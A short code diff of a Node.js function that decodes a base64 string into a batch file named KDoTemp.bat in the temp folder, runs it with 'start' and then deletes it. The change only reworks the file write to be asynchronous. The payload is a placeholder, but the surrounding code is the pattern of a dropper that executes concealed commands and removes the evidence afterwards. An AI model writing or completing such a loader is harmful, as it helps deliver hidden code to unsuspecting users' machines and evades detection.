@@ -7,12 +7,18 @@ function main() {
     var tempDir = path.join(os.tmpdir(), "KDoTemp.bat");
     var b64stuff = "BASE64ENCODEDSTUFFHERE";
     var decoded = Buffer.from(b64stuff, 'base64').toString('ascii');
-    fs.writeFileSync(tempDir, decoded);
-    exec("start " + tempDir, function (err, stdout, stderr) {
+    fs.writeFile(tempDir, decoded, function(err) {
         if (err) {
             console.log(err);
+            return;
         }
-        fs.unlinkSync(tempDir);
+        
+        exec("start " + tempDir, function (err, stdout, stderr) {
+            if (err) {
+                console.log(err);
+            }
+            fs.unlinkSync(tempDir);
+        });
     });
 }
 
